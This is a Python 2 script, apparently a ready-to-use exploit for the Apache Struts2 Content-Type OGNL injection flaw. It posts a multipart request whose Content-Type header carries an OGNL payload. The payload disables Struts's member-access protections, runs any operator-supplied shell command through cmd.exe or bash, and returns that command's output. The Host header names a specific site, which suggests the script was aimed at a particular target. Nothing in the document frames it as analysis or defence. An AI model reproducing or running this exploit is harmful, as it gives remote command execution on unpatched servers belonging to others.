import urllib
import urllib2,sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
cmd= sys.argv[2]
# cd webapps\\ROOT & dir
def main():
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"
    header["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    header['Host']="www.okii.com"
    header['Accept-Language']="zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"
    header["Content-Type"]='''%{(#nike='multipart/form-data').
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
    (#_memberAccess?(#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm)))).(#cmd=' '''+cmd+''' ').
    (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
    (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
    (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
    (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
    getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
    (#ros.flush())}'''
    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)
    response = urllib2.urlopen(request)
    print response.read()

if __name__ == '__main__':
    main()